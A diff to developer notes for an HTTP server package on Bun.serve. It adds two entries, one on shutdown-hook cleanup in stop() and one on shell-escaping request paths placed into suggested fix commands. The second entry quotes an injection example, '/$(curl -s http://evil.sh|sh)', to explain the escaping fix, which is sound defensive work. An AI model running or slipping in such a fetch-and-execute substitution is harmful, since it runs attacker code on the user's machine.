@@ -599,6 +599,20 @@ Owned request lifecycle over `Bun.serve`. Tier 2.
   `drain()` and `healthzPayload()`/`readyzPayload()`. Never keep a private `state` or
   in-flight counter — core waits on work it does not know about, so a private counter
   hangs every deploy at the `inflight` phase.
+- **`stop()` hands its two hooks back ABOVE its early return** (`As of 2026-09`). The `close` hook
+  sets `server = undefined`, so on the SIGTERM path `if (server === undefined) return` skipped the
+  `unregister?.()` pair in the `finally` — for exactly the path production takes. Every later
+  `stop()` (a test teardown, `x dev`'s role rollback) left both registrations pointing at a socket
+  that was already gone, and `shutdownHookCount()` — the probe `packages/core/CLAUDE.md` names for
+  this leak — climbed by two per server per lifecycle. `packages/http/e2e/server.e2e.test.ts` reads
+  that probe now; the shape is `@ultimat3/jobs`' worker teardown, where the release is the
+  closure's business and never the drain's.
+- **A pathname reaching a `fix:` goes through `renderFixShellArg`** (`As of 2026-09`).
+  `routeNotFound`'s fix is `x g route <path>`, a command, and the path is whatever an anonymous
+  caller typed: `GET /$(curl -s http://evil.sh|sh)` rendered that substitution verbatim into the
+  line the framework tells its reader to paste. The value still travels in the `cause`, which is
+  read rather than run. `renderFixLiteral` does not cover this — its double quotes leave `$(…)`
+  live in every POSIX shell.
 - **Borrowed error codes are never titled or registered here.** `X_FORBIDDEN` is policy's,
   `X_UNAUTHENTICATED` is auth's; both sit in `HTTP_BORROWED_ERROR_CODES`, which carries codes
   only. `HTTP_ERROR_TITLES` holds owned codes, and `registerErrorCodes` takes it whole and
